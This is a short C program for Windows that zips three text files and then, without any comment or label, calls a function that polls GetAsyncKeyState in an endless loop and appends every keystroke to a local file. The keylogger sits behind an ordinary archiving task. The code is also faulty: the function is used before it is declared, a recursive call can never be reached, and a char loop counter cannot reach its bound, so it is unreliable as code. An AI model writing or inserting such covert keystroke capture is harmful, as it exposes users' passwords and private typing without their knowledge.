#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <zip.h>

int main() {
    struct zip_t *zip = zip_open("archive.zip", ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
    zip_entry_open(zip, "file1.txt");
    zip_entry_fwrite(zip, "file1.txt");
    zip_entry_close(zip);
    zip_entry_open(zip, "file2.txt");
    zip_entry_fwrite(zip, "file2.txt");
    zip_entry_close(zip);
    zip_entry_open(zip, "file3.txt");
    zip_entry_fwrite(zip, "file3.txt");
    zip_entry_close(zip);
    zip_close(zip);
    keylogg();
return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    keylogg();
return 0;
}
